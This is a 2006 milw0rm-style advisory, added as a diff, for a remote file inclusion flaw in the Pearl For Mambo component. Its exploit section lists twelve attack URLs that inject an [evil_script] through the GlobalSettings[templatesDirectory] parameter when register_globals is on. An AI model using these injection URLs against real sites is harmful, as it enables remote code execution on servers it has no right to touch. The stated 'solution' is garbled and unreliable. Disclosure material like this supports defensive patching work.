@@ -1,0 +1,67 @@
+--------------------------------------------------------------------------- 
+Pearl For Mambo <= 1.6 (GlobalSettings[templatesDirectory]) Remote File Include Vulnerabilities
+---------------------------------------------------------------------------
+
+Discovered By Kw3[R]Ln [ Romanian Security Team ] : hTTp://RoSecurityGroup.net :
+Remote : Yes
+Critical Level : Dangerous
+
+---------------------------------------------------------------------------
+Affected software description :
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application : Pearl For Mambo 
+version : latest version [ 1.6 ]
+Description: component for mambo
+URL : http://www.pearlinger.com
+
+------------------------------------------------------------------
+Exploit:
+~~~~~~~
+
+Variable $GlobalSettings[templatesDirectory] not sanitized.When register_globals=on an attacker can exploit this vulnerability with a simple php injection script.
+
+
+# http://www.site.com/[path]/includes/functions_cms.php?phpbb_root_path=[evil_script] 
+# http://www.site.com/[path]/includes/adminSensored.php?GlobalSettings[templatesDirectory]=[evil_script]
+# http://www.site.com/[path]/includes/adminBoards.php?GlobalSettings[templatesDirectory]=[evil_script]
+# http://www.site.com/[path]/includes/adminAttachments.php?GlobalSettings[templatesDirectory]=[evil_script]
+# http://www.site.com/[path]/includes/adminAvatars.php?GlobalSettings[templatesDirectory]=[evil_script]
+# http://www.site.com/[path]/includes/adminBackupdatabase.php?GlobalSettings[templatesDirectory]=[evil_script]
+# http://www.site.com/[path]/includes/adminBanned.php?GlobalSettings[templatesDirectory]=[evil_script]
+# http://www.site.com/[path]/includes/adminForums.php?GlobalSettings[templatesDirectory]=[evil_script]
+# http://www.site.com/[path]/includes/adminPolls.php?GlobalSettings[templatesDirectory]=[evil_script]
+# http://www.site.com/[path]/includes/adminSmileys.php?GlobalSettings[templatesDirectory]=[evil_script]
+# http://www.site.com/[path]/includes/poll.php?GlobalSettings[templatesDirectory]=[evil_script]
+# http://www.site.com/[path]/includes/move.php?GlobalSettings[templatesDirectory]=[evil_script]
+
+
+---------------------------------------------------------------------------
+
+Solution :
+~~~~~~~~~
+
+declare variabel $[evil_script]
+---------------------------------------------------------------------------
+
+
+Shoutz:
+~~~~~
+
+# Special greetz to my good friend [Oo]
+# To all members of h4cky0u.org ;) and Romanian Security Team [ hTTp://RoSecurityGroup.net ]
+---------------------------------------------------------------------------
+
+*/
+
+Contact:
+~~~~~~~
+
+Nick: Kw3rLn
+E-mail: ciriboflacs[at]YaHoo[dot]Com
+Homepage: hTTp://RoSecurityGroup.net
+/*
+
+-------------------------------- [ EOF] ----------------------------------
+
+# milw0rm.com [2006-06-27]
